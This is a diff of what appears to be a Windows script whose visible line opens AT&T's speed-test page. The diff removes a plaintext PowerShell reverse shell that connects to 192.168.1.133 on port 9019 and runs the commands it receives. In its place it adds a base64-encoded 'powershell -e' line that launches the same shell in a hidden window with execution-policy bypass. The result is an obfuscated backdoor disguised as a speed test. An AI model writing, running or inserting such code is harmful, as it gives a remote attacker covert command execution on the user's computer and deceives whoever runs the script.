@@ -1,25 +1,2 @@
 start "https://www.att.com/support/speedtest/"
-$f = [System.Text.Encoding]::UTF8
-$g = '192.168.1.133'
-$h = 9019
-$i = New-Object Net.Sockets.TCPClient($g, $h)
-$j = $i.GetStream()
-$k = New-Object IO.StreamWriter($j)
-$l = { $args += 'SHELL> ' }
-$m = { $f.GetString($args, 0, $args.Length) }
-function wTS($n) {
-  $o = New-Object byte[] $i.ReceiveBufferSize
-  $k.Write($n + 'SHELL> ')
-  $k.Flush()
-}
-wTS ''
-while (($p = $j.Read($o, 0, $o.Length)) -gt 0) {
-  $q = $f.GetString($o, 0, $p)
-  try {
-    $r = Invoke-Expression $q 2>&1 | Out-String
-  } catch {
-    $r = $_ | Out-String
-  }
-  wTS $r
-}
-$k.Close()
+powershell -e cG93ZXJzaGVsbCAtbm9wIC13IGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkWD1bU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4OyRBPScxOTIuMTY4LjEuMTMzJzskUD05MDE5OyRDPU5ldy1PYmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50KCRBLCREKTskUz0kQy5HZXRTdHJlYW0oKTskVz1OZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkUyk7ZnVuY3Rpb24gWigkVCl7JEI9MC4uJEMuUmVjZWl2ZUJ1ZmZlclNpemV8JSUkaT0wfTskVy5Xcml0ZSgkVCsnIFNIPiAnKTskVy5GbHVzaCgpfTtUICcnO1tieXRlW11dJEQ9MC4uNjU1MzV8JSUkaT0wfTt3aGlsZSgoJFI9JFMuUmVhZCgkRCwwLCRGLkxlbmd0aCkpLWd0IDApeyRNPVRYLkdldFN0cmluZygkRCwwLCRSLTEpOyRPPXRyeXtpZXggJE0gMj4mMXxPdXQtU3RyaW5nfWNhdGNoeyRfIHxPdXQtU3RyaW5nfTtUICRpfTskVy5DbG9zZSgpIg==
